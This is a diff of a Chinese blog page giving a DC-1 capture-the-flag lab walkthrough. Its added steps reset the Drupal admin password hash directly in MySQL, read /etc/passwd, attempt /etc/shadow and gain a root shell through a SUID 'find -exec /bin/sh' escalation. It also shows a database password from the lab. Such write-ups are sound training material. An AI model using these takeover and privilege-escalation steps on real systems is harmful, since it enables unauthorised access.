@@ -173,7 +173,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      3.4k 字
+      4.4k 字
     </span>
   
 
@@ -183,7 +183,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      63
+      79
        分钟
     </span>
   
@@ -610,7 +610,7 @@ $databases = <span class="hljs-keyword">array</span> (
 );</code></pre>
 
 <p>看到了flag2的信息,是mysql数据库的信息,有效的应该是数据库名,用户名和密码</p>
-<h3 id="进入数据库"><a href="#进入数据库" class="headerlink" title="进入数据库"></a>进入数据库</h3><pre><code class="hljs bash">www-data@DC-1:/var/www$ mysql -h localhost -u dbuser -p
+<h3 id="进入数据库-查看"><a href="#进入数据库-查看" class="headerlink" title="进入数据库,查看"></a>进入数据库,查看</h3><pre><code class="hljs bash">www-data@DC-1:/var/www$ mysql -h localhost -u dbuser -p
 mysql -h localhost -u dbuser -p
 Enter password: R0ck3t
 
@@ -759,7 +759,7 @@ select <span class="hljs-symbol">*</span> from users;
 
 <p>这里的pass明显经过类似md5一类的加密方式加密过的,没有办法解密出来</p>
 <p>所以我们的思路是看他是怎么加密的,然后用相同的方式去加密”pass”,然后把”pass”的加密后的密文update到数据库中,替换掉原来的密文,那么就可以用”admin”和”pass”去登陆了</p>
-<h3 id="进入script目录"><a href="#进入script目录" class="headerlink" title="进入script目录"></a>进入script目录</h3><p>这里进入scripts目录看一下</p>
+<h3 id="进入script目录-生成新的密码"><a href="#进入script目录-生成新的密码" class="headerlink" title="进入script目录,生成新的密码"></a>进入script目录,生成新的密码</h3><p>这里进入scripts目录看一下</p>
 <p><em>/scripts 命令行脚本 在命令行可以执行的脚本文件，包括安装脚本，数据库备份脚本等</em></p>
 <pre><code class="hljs stata">www-data@DC-1:/<span class="hljs-keyword">var</span>/www/scripts$ <span class="hljs-keyword">ls</span>
 <span class="hljs-keyword">ls</span>
@@ -790,6 +790,126 @@ cat password-hash.sh
 
 <span class="hljs-keyword">Usage</span>:        &#123;$script&#125; [<span class="hljs-keyword">OPTIONS</span>] "&lt;plan-text password&gt;"
 Example:      &#123;$script&#125; "mynewpassword"</code></pre>
+
+<p>报错</p>
+<pre><code class="hljs groovy"><span class="hljs-string">bash:</span> password-hash.<span class="hljs-string">sh:</span> command not found</code></pre>
+
+<p><em>linux中“.sh”文件是脚本文件，一般都是bash脚本，我们可以使用sh命令运行“sh xxx.sh”，并且由于在linux中sh是链接到bash上的，所以sh与bash在功能上是没有区别的。</em></p>
+<p>文件是php文件所以再尝试生成</p>
+<pre><code class="hljs elixir">www-data<span class="hljs-variable">@DC</span><span class="hljs-number">-1</span><span class="hljs-symbol">:/var/www/scripts</span><span class="hljs-variable">$ </span>php password-hash.sh <span class="hljs-string">"pass"</span>
+php password-hash.sh <span class="hljs-string">"pass"</span>
+
+<span class="hljs-symbol">password:</span> pass          <span class="hljs-symbol">hash:</span> <span class="hljs-variable">$S</span><span class="hljs-variable">$DzK49SXmGCYyrDNDBKXru0ZdwsWB8pkwBz7l0iFvElyNNvccbEK2</span></code></pre>
+
+<h3 id="update新密码的hash"><a href="#update新密码的hash" class="headerlink" title="update新密码的hash"></a>update新密码的hash</h3><pre><code class="hljs routeros">mysql&gt; update<span class="hljs-built_in"> users </span><span class="hljs-builtin-name">set</span> <span class="hljs-attribute">pass</span>=<span class="hljs-string">"<span class="hljs-variable">$S</span><span class="hljs-variable">$DzK49SXmGCYyrDNDBKXru0ZdwsWB8pkwBz7l0iFvElyNNvccbEK2</span>"</span> where <span class="hljs-attribute">name</span>=<span class="hljs-string">"admin"</span>;
+&lt;u0ZdwsWB8pkwBz7l0iFvElyNNvccbEK2<span class="hljs-string">" where name="</span>admin<span class="hljs-string">";</span></code></pre>
+
+<h3 id="尝试登陆-flag3"><a href="#尝试登陆-flag3" class="headerlink" title="尝试登陆,flag3"></a>尝试登陆,flag3</h3><p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20201126121940.png" srcset="/img/loading.gif" alt=""></p>
+<p>登陆成功,随便点点可以看到flag3嘻嘻嘻</p>
+<p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20201126183639.png" srcset="/img/loading.gif" alt=""></p>
+<pre><code class="hljs python">Special PERMS will help FIND the passwd - but yo<span class="hljs-string">u'll need to -exec that command to work out how to get what'</span>s <span class="hljs-keyword">in</span> the shadow.
+翻译:特殊的PERMS可以帮助找到密码-但您需要-<span class="hljs-keyword">exec</span>该命令来确定如何获取隐藏的内容。</code></pre>
+
+<h3 id="找passwd文件"><a href="#找passwd文件" class="headerlink" title="找passwd文件"></a>找passwd文件</h3><p><em>Linux 系统中的 /etc/passwd 文件，是系统用户配置文件，存储了系统中所有用户的基本信息，并且所有用户都可以对此文件执行读操作。</em></p>
+<pre><code class="hljs bash">www-data@DC-1:/etc$ cat passwd
+cat passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+Debian-exim:x:101:104::/var/spool/exim4:/bin/<span class="hljs-literal">false</span>
+statd:x:102:65534::/var/lib/nfs:/bin/<span class="hljs-literal">false</span>
+messagebus:x:103:107::/var/run/dbus:/bin/<span class="hljs-literal">false</span>
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/<span class="hljs-literal">false</span>
+flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</code></pre>
+
+<p><em>用户名：密码：UID（用户ID）：GID（组ID）：描述性信息：主目录：默认Shell</em></p>
+<p>看到最后一行有个叫flag4的用户</p>
+<h3 id="进入-home目录-falg4"><a href="#进入-home目录-falg4" class="headerlink" title="进入/home目录,falg4"></a>进入/home目录,falg4</h3><pre><code class="hljs elixir">www-data<span class="hljs-variable">@DC</span><span class="hljs-number">-1</span><span class="hljs-symbol">:/home</span><span class="hljs-variable">$ </span>ls
+ls
+flag4</code></pre>
+
+<pre><code class="hljs oxygene">www-data@DC-<span class="hljs-number">1</span>:/home/flag4$ cat flag4.txt
+cat flag4.txt
+Can you use this same <span class="hljs-function"><span class="hljs-keyword">method</span> <span class="hljs-title">to</span> <span class="hljs-title">find</span> <span class="hljs-title">or</span> <span class="hljs-title">access</span> <span class="hljs-title">the</span> <span class="hljs-title">flag</span> <span class="hljs-title">in</span> <span class="hljs-title">root</span>?
+
+<span class="hljs-title">Probably</span>. <span class="hljs-title">But</span> <span class="hljs-title">perhaps</span> <span class="hljs-title">it</span>'<span class="hljs-title">s</span> <span class="hljs-title">not</span> <span class="hljs-title">that</span> <span class="hljs-title">easy</span>.  <span class="hljs-title">Or</span> <span class="hljs-title">maybe</span> <span class="hljs-title">it</span> <span class="hljs-title">is</span>?</span></code></pre>
+
+<p>flag4的提示说需要拿到root用户,可能还有最后一个flag</p>
+<h3 id="尝试打开etc-shadow文件"><a href="#尝试打开etc-shadow文件" class="headerlink" title="尝试打开etc/shadow文件"></a>尝试打开etc/shadow文件</h3><pre><code class="hljs vim">www-data@DC-<span class="hljs-number">1</span>:/etc$ <span class="hljs-keyword">cat</span> shadow 
+<span class="hljs-keyword">cat</span> shadow
+<span class="hljs-keyword">ca</span><span class="hljs-variable">t:</span> shado<span class="hljs-variable">w:</span> Permission denied</code></pre>
+
+<p>发现www-data用户<strong>无权限</strong>看到里面的内容</p>
+<p><em>/etc/shadow 文件只有 root 用户拥有读权限，其他用户没有任何权限，这样就保证了用户密码的安全性。</em></p>
+<p>这就和flag4的拿root的提示相同了,拿接下来的任务就是拿root权限了</p>
+<h3 id="拿root权限-提权"><a href="#拿root权限-提权" class="headerlink" title="拿root权限(提权)"></a>拿root权限(提权)</h3><p>提权第一时间想到suid提权,首先查看系统上运行的所有SUID可执行文件</p>
+<pre><code class="hljs routeros"><span class="hljs-comment">#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span>
+<span class="hljs-builtin-name">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span>
+<span class="hljs-builtin-name">find</span> / -user root -perm -4000-print2&gt;/dev/<span class="hljs-literal">null</span>
+<span class="hljs-builtin-name">find</span> / -user root -perm -4000-exec ls -ldb &#123;&#125; \;</code></pre>
+
+<pre><code class="hljs crystal">www-data@DC-<span class="hljs-number">1</span>:<span class="hljs-regexp">/etc$ 
+find /</span> -perm -u=s -<span class="hljs-keyword">type</span> f <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/nullfind</span> / -perm -u=s -<span class="hljs-keyword">type</span> f <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/null</span>
+<span class="hljs-regexp">/bin/mount</span>
+<span class="hljs-regexp">/bin/ping</span>
+<span class="hljs-regexp">/bin/su</span>
+<span class="hljs-regexp">/bin/ping</span>6
+<span class="hljs-regexp">/bin/umount</span>
+<span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/at
+/usr</span><span class="hljs-regexp">/bin/chsh</span>
+<span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/passwd
+/usr</span><span class="hljs-regexp">/bin/newgrp</span>
+<span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/chfn
+/usr</span><span class="hljs-regexp">/bin/gpasswd</span>
+<span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/procmail
+/usr</span><span class="hljs-regexp">/bin/find</span>
+<span class="hljs-regexp">/usr/sbin</span><span class="hljs-regexp">/exim4
+/usr</span><span class="hljs-regexp">/lib/pt</span>_chown
+<span class="hljs-regexp">/usr/lib</span><span class="hljs-regexp">/openssh/ssh</span>-keysign
+<span class="hljs-regexp">/usr/lib</span><span class="hljs-regexp">/eject/dmcrypt</span>-get-device
+<span class="hljs-regexp">/usr/lib</span><span class="hljs-regexp">/dbus-1.0/dbus</span>-daemon-launch-helper
+<span class="hljs-regexp">/sbin/mount</span>.nfs</code></pre>
+
+<p>利用find文件提权</p>
+<pre><code class="hljs bash">www-data@DC-1:/etc$ find ./ aaa -<span class="hljs-built_in">exec</span> <span class="hljs-string">'/bin/sh'</span> \;
+find ./ aaa -<span class="hljs-built_in">exec</span> <span class="hljs-string">'/bin/sh'</span> \;
+<span class="hljs-comment"># whoami</span>
+whoami
+root</code></pre>
+
+<p>提权成功!</p>
+<h3 id="finalflag"><a href="#finalflag" class="headerlink" title="finalflag"></a>finalflag</h3><pre><code class="hljs bash"><span class="hljs-comment"># cd root</span>
+<span class="hljs-built_in">cd</span> root
+<span class="hljs-comment"># ls</span>
+ls
+thefinalflag.txt
+<span class="hljs-comment"># cat thefinalflag.txt</span>
+cat thefinalflag.txt
+Well <span class="hljs-keyword">done</span>!!!!
+
+Hopefully you<span class="hljs-string">'ve enjoyed this and learned some new skills.
+
+You can let me know what you thought of this little journey
+by contacting me via Twitter - @DCAU7</span></code></pre>
+
+
 
 
             </div>
